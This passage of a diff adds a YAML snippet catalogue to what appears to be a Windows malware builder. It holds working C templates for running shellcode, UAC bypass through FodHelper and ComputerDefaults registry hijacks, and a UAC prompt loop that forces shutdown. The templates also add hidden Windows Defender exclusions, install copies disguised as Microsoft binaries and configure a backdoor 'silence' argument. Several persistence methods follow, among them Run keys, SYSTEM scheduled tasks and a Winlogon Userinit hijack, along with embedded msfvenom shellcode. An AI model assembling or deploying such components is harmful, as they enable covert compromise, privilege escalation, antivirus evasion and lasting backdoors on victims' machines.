+          __try { ((void(*)())m)(); }
+          __except(EXCEPTION_EXECUTE_HANDLER) {}
+      }
+  - id: RWXAlloc
+    display: Single RWX Allocation
+    default: false
+    snippet: |
+      // Even smaller - direct RWX allocation
+      void* m = VirtualAlloc(0, code_blob_len, 0x3000, 0x40);
+      memcpy(m, code_blob, code_blob_len);
+      __try { ((void(*)())m)(); }
+      __except(EXCEPTION_EXECUTE_HANDLER) {}
+- header: UAC Bypass
+  template: uacb
+  display: UAC Bypass
+  allowMultiple: false
+  items:
+  - id: None
+    display: None (Skip)
+    default: true
+    requires: []
+    snippet: |
+      // No UAC bypass
+  - id: FodHelper
+    display: FodHelper Method
+    default: false
+    requires: []
+    snippet: |
+      // UAC Bypass via FodHelper registry hijack
+      {
+          HKEY hKey;
+          if (RegCreateKeyExA(HKEY_CURRENT_USER,
+              "Software\\Classes\\ms-settings\\shell\\open\\command",
+              0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+              const char* cmd = "C:\\Windows\\System32\\cmd.exe";
+              RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, (DWORD)(strlen(cmd) + 1));
+              RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
+              RegCloseKey(hKey);
+
+              SHELLEXECUTEINFOA sei = {sizeof(sei)};
+              sei.lpVerb = "open";
+              sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
+              sei.nShow = SW_HIDE;
+              ShellExecuteExA(&sei);
+              Sleep(3000);
+
+              RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
+          }
+      }
+  - id: ComputerDefaults
+    display: ComputerDefaults Method
+    default: false
+    requires: []
+    snippet: |
+      // UAC Bypass via ComputerDefaults
+      {
+          HKEY hKey;
+          if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command",
+                              0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+              const wchar_t* cmd = L"cmd.exe";
+              RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, (DWORD)((wcslen(cmd) + 1) * sizeof(wchar_t)));
+              RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
+              RegCloseKey(hKey);
+
+              ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, SW_HIDE);
+              Sleep(3000);
+
+              RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
+          }
+      }
+  - id: UacLoop
+    display: UAC Loop (Spam Until Yes or Shutdown)
+    default: false
+    requires: []
+    inputs:
+    - id: uac_loop_max_denials
+      label: "Max denials before shutdown (0 = forever)"
+      type: textbox
+      defaultValue: "0"
+      placeholder: "0"
+    - id: uac_loop_retry_ms
+      label: "Retry delay (ms)"
+      type: textbox
+      defaultValue: "300"
+      placeholder: "300"
+    snippet: |
+      // UAC Bypass: Loop ShellExecute("runas") until the user accepts or the
+      // configured denial threshold triggers a forced system shutdown.
+      // Relies on wash_demand_elevation_or_shutdown() from the shared preamble:
+      //   - if already elevated, returns immediately
+      //   - otherwise reprompts in a tight loop; cancelling the dialog reopens it
+      //   - hitting max_denials calls ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE)
+      // Set max_denials = 0 to loop forever.
+      wash_demand_elevation_or_shutdown((DWORD)$uac_loop_max_denials$, (DWORD)$uac_loop_retry_ms$);
+
+- header: Evasion
+  template: evasion
+  display: Evasion
+  allowMultiple: true
+  items:
+  - id: None
+    display: None (Skip)
+    default: true
+    requires: []
+    snippet: |
+      // No evasion
+  - id: DefenderExclusion
+    display: Defender Exclusion (Self + Persistence Drops)
+    default: false
+    requires:
+    - uac_bypass
+    snippet: |
+      // Evasion: Add the running executable AND every tracked persistence drop
+      // (wash_copies[], populated by Persistence snippets) to Windows Defender's
+      // path-exclusions list. Issued via Add-MpPreference under powershell.exe
+      // with WindowStyle Hidden. Requires administrator rights — guard with a
+      // UAC bypass snippet so wash_is_elevated() returns TRUE before reaching
+      // this point.
+      {
+          // Self-track: ensure the installed payload path is in wash_copies[] so
+          // Defender exclusion covers it even if no persistence snippet ran.
+          wash_track(wash_payload_path());
+
+          for (int _i = 0; _i < wash_copies_count; _i++) {
+              WCHAR _ev_cmd[1024] = {0};
+              wsprintfW(_ev_cmd,
+                        L"powershell.exe -NoProfile -WindowStyle Hidden "
+                        L"-Command \"Add-MpPreference -ExclusionPath '%s'\"",
+                        wash_copies[_i]);
+              STARTUPINFOW        _ev_si = {sizeof(_ev_si)};
+              PROCESS_INFORMATION _ev_pi = {0};
+              _ev_si.dwFlags     = STARTF_USESHOWWINDOW;
+              _ev_si.wShowWindow = SW_HIDE;
+              if (CreateProcessW(NULL, _ev_cmd, NULL, NULL, FALSE,
+                                 CREATE_NO_WINDOW, NULL, NULL, &_ev_si, &_ev_pi)) {
+                  WaitForSingleObject(_ev_pi.hProcess, 10000);
+                  CloseHandle(_ev_pi.hProcess);
+                  CloseHandle(_ev_pi.hThread);
+              }
+          }
+      }
+
+- header: Generic Payload
+  template: genericshellcode
+  display: Generic Payload
+  allowMultiple: false
+  items:
+  - id: CalcShellcode
+    display: Calculator Shellcode (x64)
+    default: true
+    snippet: |
+      // msfvenom -p windows/x64/exec EXITFUNC=thread CMD=calc.exe -f c -a x64
+      unsigned char code_blob[] =
+          "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+          "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+          "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+          "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+          "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+          "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+          "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+          "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+          "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+          "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+          "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+          "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+          "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+          "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+          "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+          "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+          "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+          "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+          "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+          "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+      unsigned int code_blob_len = 277;
+  - id: MessageBoxShellcode
+    display: MessageBox Shellcode (x64)
+    default: false
+    snippet: |
+      // Simple MessageBox shellcode for testing
+      unsigned char code_blob[] =
+          "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00"
+          "\x00\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C"
+          "\x8B\xF8\x48\x8D\x0D\x5D\x00\x00\x00\xE8\x8F\x00\x00\x00"
+          "\x48\x8B\xC8\x4D\x33\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48"
+          "\x8D\x15\x54\x00\x00\x00\x48\xFF\xD0\x48\x8D\x15\x6F\x00"
+          "\x00\x00\x48\x8D\x0D\x63\x00\x00\x00\xE8\x63\x00\x00\x00"
+          "\x4C\x8B\xF8\x48\x8D\x0D\x68\x00\x00\x00\xE8\x54\x00\x00"
+          "\x00\x48\x8B\xC8\x48\x33\xD2\x48\xFF\xD0\x00\x6B\x65\x72"
+          "\x6E\x65\x6C\x33\x32\x2E\x64\x6C\x6C\x00\x75\x73\x65\x72"
+          "\x33\x32\x2E\x64\x6C\x6C\x00\x4D\x65\x73\x73\x61\x67\x65"
+          "\x42\x6F\x78\x41\x00\x48\x65\x6C\x6C\x6F\x00\x57\x6F\x72"
+          "\x6C\x64\x00\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73"
+          "\x00";
+      unsigned int code_blob_len = 162;
+- header: Installation
+  template: installation
+  display: Installation
+  allowMultiple: false
+  items:
+  - id: None
+    display: None (Run In-Place)
+    default: true
+    requires: []
+    snippet: |
+      // No installation — persistence will be tied to the current launch path.
+
+  - id: AppDataDir
+    display: APPDATA Install Directory (User-Level)
+    default: false
+    requires: []
+    inputs:
+    - id: appdata_install_dir
+      label: "Sub-directory under %APPDATA%"
+      type: textbox
+      defaultValue: "Microsoft\\EdgeUpdate"
+      placeholder: "Microsoft\\EdgeUpdate"
+    - id: appdata_install_file
+      label: "Installed Filename"
+      type: textbox
+      defaultValue: "MicrosoftEdgeUpdate.exe"
+      placeholder: "MicrosoftEdgeUpdate.exe"
+    snippet: |
+      // Installation: Copy payload to %APPDATA%\<dir>\<file>.
+      // Creates the directory tree if it does not exist.
+      // If already running from the install path, skips copy and relaunch.
+      // Otherwise copies itself there, launches the installed copy, and exits —
+      // so all subsequent snippets (persistence, evasion) run from the stable path.
+      {
+          WCHAR _inst_src[MAX_PATH] = {0};
+          WCHAR _inst_dir[MAX_PATH] = {0};
+          WCHAR _inst_dst[MAX_PATH] = {0};
+          wcscpy_s(_inst_src, MAX_PATH, wash_payload_path());
+          ExpandEnvironmentStringsW(L"%APPDATA%\\$appdata_install_dir$", _inst_dir, MAX_PATH);
+          SHCreateDirectoryExW(NULL, _inst_dir, NULL);
+          wsprintfW(_inst_dst, L"%s\\$appdata_install_file$", _inst_dir);
+          if (_wcsicmp(_inst_src, _inst_dst) != 0) {
+              if (CopyFileW(_inst_src, _inst_dst, FALSE)) {
+                  STARTUPINFOW        _inst_si = {sizeof(_inst_si)};
+                  PROCESS_INFORMATION _inst_pi = {0};
+                  if (CreateProcessW(_inst_dst, NULL, NULL, NULL, FALSE,
+                                     0, NULL, NULL, &_inst_si, &_inst_pi)) {
+                      CloseHandle(_inst_pi.hProcess);
+                      CloseHandle(_inst_pi.hThread);
+                  }
+                  ExitProcess(0);
+              }
+          }
+          wcscpy_s(wash_install_path, MAX_PATH, _inst_dst);
+          wash_track(wash_install_path);
+      }
+
+  - id: LocalAppDataDir
+    display: LOCALAPPDATA Install Directory (User-Level)
+    default: false
+    requires: []
+    inputs:
+    - id: localappdata_install_dir
+      label: "Sub-directory under %LOCALAPPDATA%"
+      type: textbox
+      defaultValue: "Microsoft\\OneDrive"
+      placeholder: "Microsoft\\OneDrive"
+    - id: localappdata_install_file
+      label: "Installed Filename"
+      type: textbox
+      defaultValue: "OneDriveStandaloneUpdater.exe"
+      placeholder: "OneDriveStandaloneUpdater.exe"
+    snippet: |
+      // Installation: Copy payload to %LOCALAPPDATA%\<dir>\<file>.
+      // No administrator rights required.
+      {
+          WCHAR _inst_src[MAX_PATH] = {0};
+          WCHAR _inst_dir[MAX_PATH] = {0};
+          WCHAR _inst_dst[MAX_PATH] = {0};
+          wcscpy_s(_inst_src, MAX_PATH, wash_payload_path());
+          ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\$localappdata_install_dir$", _inst_dir, MAX_PATH);
+          SHCreateDirectoryExW(NULL, _inst_dir, NULL);
+          wsprintfW(_inst_dst, L"%s\\$localappdata_install_file$", _inst_dir);
+          if (_wcsicmp(_inst_src, _inst_dst) != 0) {
+              if (CopyFileW(_inst_src, _inst_dst, FALSE)) {
+                  STARTUPINFOW        _inst_si = {sizeof(_inst_si)};
+                  PROCESS_INFORMATION _inst_pi = {0};
+                  if (CreateProcessW(_inst_dst, NULL, NULL, NULL, FALSE,
+                                     0, NULL, NULL, &_inst_si, &_inst_pi)) {
+                      CloseHandle(_inst_pi.hProcess);
+                      CloseHandle(_inst_pi.hThread);
+                  }
+                  ExitProcess(0);
+              }
+          }
+          wcscpy_s(wash_install_path, MAX_PATH, _inst_dst);
+          wash_track(wash_install_path);
+      }
+
+  - id: ProgramDataDir
+    display: ProgramData Install Directory (Requires Admin)
+    default: false
+    requires:
+    - uac_bypass
+    inputs:
+    - id: programdata_install_dir
+      label: "Sub-directory under %ProgramData%"
+      type: textbox
+      defaultValue: "Microsoft\\Windows Defender\\Platform"
+      placeholder: "Microsoft\\Windows Defender\\Platform"
+    - id: programdata_install_file
+      label: "Installed Filename"
+      type: textbox
+      defaultValue: "MsMpEng.exe"
+      placeholder: "MsMpEng.exe"
+    snippet: |
+      // Installation: Copy payload to %ProgramData%\<dir>\<file>.
+      // Requires administrator rights — use a UAC bypass snippet before this.
+      {
+          wash_demand_elevation_or_shutdown(0, 300);
+          WCHAR _inst_src[MAX_PATH] = {0};
+          WCHAR _inst_dir[MAX_PATH] = {0};
+          WCHAR _inst_dst[MAX_PATH] = {0};
+          wcscpy_s(_inst_src, MAX_PATH, wash_payload_path());
+          ExpandEnvironmentStringsW(L"%ProgramData%\\$programdata_install_dir$", _inst_dir, MAX_PATH);
+          SHCreateDirectoryExW(NULL, _inst_dir, NULL);
+          wsprintfW(_inst_dst, L"%s\\$programdata_install_file$", _inst_dir);
+          if (_wcsicmp(_inst_src, _inst_dst) != 0) {
+              if (CopyFileW(_inst_src, _inst_dst, FALSE)) {
+                  STARTUPINFOW        _inst_si = {sizeof(_inst_si)};
+                  PROCESS_INFORMATION _inst_pi = {0};
+                  if (CreateProcessW(_inst_dst, NULL, NULL, NULL, FALSE,
+                                     0, NULL, NULL, &_inst_si, &_inst_pi)) {
+                      CloseHandle(_inst_pi.hProcess);
+                      CloseHandle(_inst_pi.hThread);
+                  }
+                  ExitProcess(0);
+              }
+          }
+          wcscpy_s(wash_install_path, MAX_PATH, _inst_dst);
+          wash_track(wash_install_path);
+      }
+
+- header: Backdoor Config
+  template: backdoorconfig
+  display: Backdoor Config
+  allowMultiple: false
+  items:
+  - id: None
+    display: None (Skip)
+    default: true
+    requires: []
+    snippet: |
+      // No backdoor config — wash_silence_arg is empty; persistence registers the plain path.
+
+  - id: SilenceArg
+    display: Silence Argument (for Silence backdoor mode)
+    default: false
+    requires: []
+    inputs:
+    - id: silence_arg_value
+      label: "Silence Mode Argument"
+      type: textbox
+      defaultValue: "/s"
+      placeholder: "/s"
+    snippet: |
+      // Backdoor Config: Silence Argument
+      // Sets wash_silence_arg so persistence snippets register the payload command with
+      // this argument suffix. When the backdoored PE detects this argument at runtime it
+      // takes the silent execution path (implant runs, host UI is suppressed).
+      // Must match the -Mode silence configuration of the washmachine backdoor command.
+      wcscpy_s(wash_silence_arg, 256, L"$silence_arg_value$");
+
+- header: Persistence
+  template: persistence
+  display: Persistence
+  allowMultiple: false
+  items:
+  - id: None
+    display: None (Skip)
+    default: true
+    requires: []
+    snippet: |
+      // No persistence
+
+  - id: HkcuRunKey
+    display: HKCU Run Key (User-Level)
+    default: false
+    requires: []
+    inputs:
+    - id: hkcu_run_value_name
+      label: "Registry Value Name"
+      type: textbox
+      defaultValue: "WindowsUpdate"
+      placeholder: "WindowsUpdate"
+    snippet: |
+      // Persistence: HKCU Run Registry Key
+      // Adds the installed payload command to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
+      // wash_payload_cmd() returns the Installation-category path with any silence arg appended,
+      // falling back to wash_payload_path() when no silence arg is configured.
+      // Starts automatically on every user logon. No administrator rights required.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          WCHAR _pers_path[MAX_PATH + 256] = {0};
+          HKEY  _pers_hKey;
+          wcscpy_s(_pers_path, MAX_PATH + 256, wash_payload_cmd());
+          wash_track(wash_payload_path());
+          if (RegOpenKeyExW(HKEY_CURRENT_USER,
+                            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                            0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
+              RegSetValueExW(_pers_hKey, L"$hkcu_run_value_name$", 0, REG_SZ,
+                             (BYTE*)_pers_path,
+                             (DWORD)((wcslen(_pers_path) + 1) * sizeof(WCHAR)));
+              RegCloseKey(_pers_hKey);
+          }
+      }
+
+  - id: StartupFolder
+    display: Startup Folder (User-Level)
+    default: false
+    requires: []
+    inputs:
+    - id: startup_file_name
+      label: "Dropped Filename"
+      type: textbox
+      defaultValue: "svchost.exe"
+      placeholder: "svchost.exe"
+    snippet: |
+      // Persistence: User Startup Folder
+      // Copies the installed payload (wash_payload_path()) into the current user's
+      // Startup folder. wash_payload_path() returns the Installation-category path
+      // when set, otherwise the current module path (run-in-place mode).
+      // Launched on every logon. No administrator rights required.
+      // Registers the dropped path in wash_copies[] so subsequent evasion steps
+      // (e.g. Defender exclusions) can apply to every dropped copy.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          WCHAR _sf_src[MAX_PATH] = {0};
+          WCHAR _sf_dir[MAX_PATH] = {0};
+          WCHAR _sf_dst[MAX_PATH] = {0};
+          wcscpy_s(_sf_src, MAX_PATH, wash_payload_path());
+          ExpandEnvironmentStringsW(
+              L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+              _sf_dir, MAX_PATH);
+          wsprintfW(_sf_dst, L"%s\\$startup_file_name$", _sf_dir);
+          if (CopyFileW(_sf_src, _sf_dst, FALSE)) {
+              wash_track(_sf_dst);
+          }
+      }
+
+  - id: ScheduledTask
+    display: Scheduled Task (User-Level)
+    default: false
+    requires: []
+    inputs:
+    - id: sched_task_name
+      label: "Task Name"
+      type: textbox
+      defaultValue: "MicrosoftEdgeUpdateTask"
+      placeholder: "MicrosoftEdgeUpdateTask"
+    snippet: |
+      // Persistence: Scheduled Task via schtasks.exe
+      // Creates a logon-triggered task that runs the installed payload silently.
+      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // falls back to the current module path (run-in-place mode).
+      // When wash_silence_arg is set (BackdoorConfig/SilenceArg snippet), the task's
+      // /TR value includes the silence argument so the backdoored host takes the silent
+      // execution path on every scheduled launch.
+      // Uses /RL LIMITED (no UAC prompt required). Overwrites existing task with /F.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          WCHAR _st_exe[MAX_PATH]      = {0};
+          WCHAR _st_cmd[1024]          = {0};
+          STARTUPINFOW        _st_si   = {sizeof(_st_si)};
+          PROCESS_INFORMATION _st_pi   = {0};
+          wcscpy_s(_st_exe, MAX_PATH, wash_payload_path());
+          wash_track(_st_exe);
+          if (wash_silence_arg[0] != L'\0') {
+              wsprintfW(_st_cmd,
+                        L"cmd.exe /C schtasks /Create /TN \"$sched_task_name$\" "
+                        L"/TR \"\\\"%s\\\" %s\" /SC ONLOGON /RL LIMITED /F",
+                        _st_exe, wash_silence_arg);
+          } else {
+              wsprintfW(_st_cmd,
+                        L"cmd.exe /C schtasks /Create /TN \"$sched_task_name$\" "
+                        L"/TR \"\\\"%s\\\"\" /SC ONLOGON /RL LIMITED /F",
+                        _st_exe);
+          }
+          _st_si.dwFlags     = STARTF_USESHOWWINDOW;
+          _st_si.wShowWindow = SW_HIDE;
+          if (CreateProcessW(NULL, _st_cmd, NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &_st_si, &_st_pi)) {
+              WaitForSingleObject(_st_pi.hProcess, 5000);
+              CloseHandle(_st_pi.hProcess);
+              CloseHandle(_st_pi.hThread);
+          }
+      }
+
+  - id: HklmRunKey
+    display: HKLM Run Key (Requires Admin)
+    default: false
+    requires:
+    - uac_bypass
+    inputs:
+    - id: hklm_run_value_name
+      label: "Registry Value Name"
+      type: textbox
+      defaultValue: "WindowsDefenderUpdate"
+      placeholder: "WindowsDefenderUpdate"
+    snippet: |
+      // Persistence: HKLM Run Registry Key
+      // Adds the installed payload command to HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
+      // wash_payload_cmd() returns the Installation-category path with any silence arg appended,
+      // falling back to wash_payload_path() when no silence arg is configured.
+      // Runs at logon for ALL users. Requires administrator rights to write.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          // Loop UAC prompt until the user accepts. 0 = forever, 300ms retry.
+          wash_demand_elevation_or_shutdown(0, 300);
+
+          WCHAR _pers_path[MAX_PATH + 256] = {0};
+          HKEY  _pers_hKey;
+          wcscpy_s(_pers_path, MAX_PATH + 256, wash_payload_cmd());
+          wash_track(wash_payload_path());
+          if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+                            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                            0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
+              RegSetValueExW(_pers_hKey, L"$hklm_run_value_name$", 0, REG_SZ,
+                             (BYTE*)_pers_path,
+                             (DWORD)((wcslen(_pers_path) + 1) * sizeof(WCHAR)));
+              RegCloseKey(_pers_hKey);
+          }
+      }
+
+  - id: LogonScript
+    display: Logon Script (HKCU UserInitMprLogonScript, User-Level)
+    default: false
+    requires: []
+    inputs:
+    - id: logon_script_file_name
+      label: "Dropped Filename"
+      type: textbox
+      defaultValue: "msedge_update.exe"
+      placeholder: "msedge_update.exe"
+    snippet: |
+      // Persistence: HKCU UserInitMprLogonScript Logon Script
+      // Copies the installed payload to %APPDATA%\Microsoft\Windows\ and registers
+      // it as the user's logon script via HKCU\Environment\UserInitMprLogonScript.
+      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // falls back to the current module path (run-in-place mode).
+      // winlogon.exe invokes every path in this value at each interactive logon via
+      // the Multi-Provider Router (MPR). No administrator rights required.
+      // Very low AV/EDR signature rate. Survives reboots and user re-logons.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          WCHAR _ls_src[MAX_PATH] = {0};
+          WCHAR _ls_dir[MAX_PATH] = {0};
+          WCHAR _ls_dst[MAX_PATH] = {0};
+          HKEY  _ls_hKey;
+          wcscpy_s(_ls_src, MAX_PATH, wash_payload_path());
+          ExpandEnvironmentStringsW(L"%APPDATA%\\Microsoft\\Windows", _ls_dir, MAX_PATH);
+          wsprintfW(_ls_dst, L"%s\\$logon_script_file_name$", _ls_dir);
+          if (!CopyFileW(_ls_src, _ls_dst, FALSE))
+              wcscpy_s(_ls_dst, MAX_PATH, _ls_src);
+          else
+              wash_track(_ls_dst);
+          if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment",
+                            0, KEY_SET_VALUE, &_ls_hKey) == ERROR_SUCCESS) {
+              RegSetValueExW(_ls_hKey, L"UserInitMprLogonScript", 0, REG_SZ,
+                             (BYTE*)_ls_dst,
+                             (DWORD)((wcslen(_ls_dst) + 1) * sizeof(WCHAR)));
+              RegCloseKey(_ls_hKey);
+          }
+      }
+
+  - id: AllUsersStartup
+    display: All-Users Startup Folder (Admin)
+    default: false
+    requires:
+    - uac_bypass
+    inputs:
+    - id: allusers_startup_file_name
+      label: "Dropped Filename"
+      type: textbox
+      defaultValue: "RuntimeBrokerHelper.exe"
+      placeholder: "RuntimeBrokerHelper.exe"
+    snippet: |
+      // Persistence: All-Users Startup Folder
+      // Copies the installed payload into
+      // %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup.
+      // wash_payload_path() returns the Installation-category path when set, otherwise
+      // falls back to the current module path (run-in-place mode).
+      // Launched automatically at every logon for ANY user on the system.
+      // Requires administrator rights. No Task Scheduler entry is created.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          wash_demand_elevation_or_shutdown(0, 300);
+          WCHAR _aus_src[MAX_PATH] = {0};
+          WCHAR _aus_dir[MAX_PATH] = {0};
+          WCHAR _aus_dst[MAX_PATH] = {0};
+          wcscpy_s(_aus_src, MAX_PATH, wash_payload_path());
+          ExpandEnvironmentStringsW(
+              L"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+              _aus_dir, MAX_PATH);
+          wsprintfW(_aus_dst, L"%s\\$allusers_startup_file_name$", _aus_dir);
+          if (CopyFileW(_aus_src, _aus_dst, FALSE))
+              wash_track(_aus_dst);
+      }
+
+  - id: SchtasksSystem
+    display: Scheduled Task at Boot as SYSTEM (Admin)
+    default: false
+    requires:
+    - uac_bypass
+    inputs:
+    - id: sched_system_task_name
+      label: "Task Name"
+      type: textbox
+      defaultValue: "MicrosoftWindowsDefenderPeriodicScanCheck"
+      placeholder: "MicrosoftWindowsDefenderPeriodicScanCheck"
+    - id: sched_startup_delay
+      label: "Startup delay (HHMM:SS)"
+      type: textbox
+      defaultValue: "0001:00"
+      placeholder: "0001:00"
+    snippet: |
+      // Persistence: Scheduled Task — System Boot, SYSTEM Account
+      // Creates a task that fires at every system startup (/SC ONSTART) running as
+      // SYSTEM with highest privilege (/RU SYSTEM /RL HIGHEST). Unlike ONLOGON tasks
+      // this executes before any interactive session exists — ideal for network-facing
+      // payloads and C2 beacons. wash_payload_path() returns the Installation-category
+      // path when set, otherwise falls back to the current module path (run-in-place).
+      // When wash_silence_arg is set (BackdoorConfig/SilenceArg snippet), the task's
+      // /TR value includes the silence argument so the backdoored host takes the silent
+      // execution path on every scheduled launch.
+      // Requires administrator rights.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          wash_demand_elevation_or_shutdown(0, 300);
+          WCHAR _ss_exe[MAX_PATH] = {0};
+          WCHAR _ss_cmd[1024]     = {0};
+          STARTUPINFOW        _ss_si = {sizeof(_ss_si)};
+          PROCESS_INFORMATION _ss_pi = {0};
+          wcscpy_s(_ss_exe, MAX_PATH, wash_payload_path());
+          wash_track(_ss_exe);
+          if (wash_silence_arg[0] != L'\0') {
+              wsprintfW(_ss_cmd,
+                        L"cmd.exe /C schtasks /Create /TN \"$sched_system_task_name$\" "
+                        L"/TR \"\\\"%s\\\" %s\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /DELAY $sched_startup_delay$",
+                        _ss_exe, wash_silence_arg);
+          } else {
+              wsprintfW(_ss_cmd,
+                        L"cmd.exe /C schtasks /Create /TN \"$sched_system_task_name$\" "
+                        L"/TR \"\\\"%s\\\"\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /DELAY $sched_startup_delay$",
+                        _ss_exe);
+          }
+          _ss_si.dwFlags     = STARTF_USESHOWWINDOW;
+          _ss_si.wShowWindow = SW_HIDE;
+          if (CreateProcessW(NULL, _ss_cmd, NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &_ss_si, &_ss_pi)) {
+              WaitForSingleObject(_ss_pi.hProcess, 5000);
+              CloseHandle(_ss_pi.hProcess);
+              CloseHandle(_ss_pi.hThread);
+          }
+      }
+
+  - id: WinlogonUserinit
+    display: Winlogon Userinit Hijack (Admin)
+    default: false
+    requires:
+    - uac_bypass
+    snippet: |
+      // Persistence: Winlogon Userinit Registry Hijack
+      // Appends the installed payload command to the comma-separated Userinit value at
+      // HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.
+      // wash_payload_cmd() returns the path with any silence arg so that the backdoored
+      // host takes the silent execution path on every Winlogon-triggered launch.
+      // winlogon.exe launches every comma-separated entry at each interactive logon.
+      // The default value is "C:\Windows\system32\userinit.exe," — we append after it.
+      // Idempotent: skips the write if the raw path is already present in the value.
+      // Requires administrator rights.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          wash_demand_elevation_or_shutdown(0, 300);
+          WCHAR _wu_cmd[MAX_PATH + 256]      = {0};
+          WCHAR _wu_path[MAX_PATH]           = {0};
+          WCHAR _wu_cur[1024]                = {0};
+          WCHAR _wu_new[1024 + MAX_PATH + 258] = {0};
+          HKEY  _wu_hKey;
+          wcscpy_s(_wu_path, MAX_PATH, wash_payload_path());
+          wcscpy_s(_wu_cmd, MAX_PATH + 256, wash_payload_cmd());
+          wash_track(_wu_path);
+          if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+                            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+                            0, KEY_QUERY_VALUE | KEY_SET_VALUE, &_wu_hKey) == ERROR_SUCCESS) {
+              DWORD _wu_type = 0;
+              DWORD _wu_sz   = (DWORD)sizeof(_wu_cur);
+              RegQueryValueExW(_wu_hKey, L"Userinit", NULL,
+                               &_wu_type, (BYTE*)_wu_cur, &_wu_sz);
+              if (wcsstr(_wu_cur, _wu_path) == NULL) {
+                  size_t _wu_len = wcslen(_wu_cur);
+                  if (_wu_len > 0 && _wu_cur[_wu_len - 1] != L',')
+                      wcscat_s(_wu_cur, 1024, L",");
+                  wsprintfW(_wu_new, L"%s%s,", _wu_cur, _wu_cmd);
+                  RegSetValueExW(_wu_hKey, L"Userinit", 0, REG_SZ,
+                                 (BYTE*)_wu_new,
+                                 (DWORD)((wcslen(_wu_new) + 1) * sizeof(WCHAR)));
+              }
+              RegCloseKey(_wu_hKey);
+          }
+      }
+
+  - id: WmiEventSubscription
+    display: WMI Permanent Event Subscription (Admin)
+    default: false
+    requires:
+    - uac_bypass
+    inputs:
+    - id: wmi_filter_name
+      label: "WMI Filter Name"
+      type: textbox
+      defaultValue: "MicrosoftWindowsUpdateFilter"
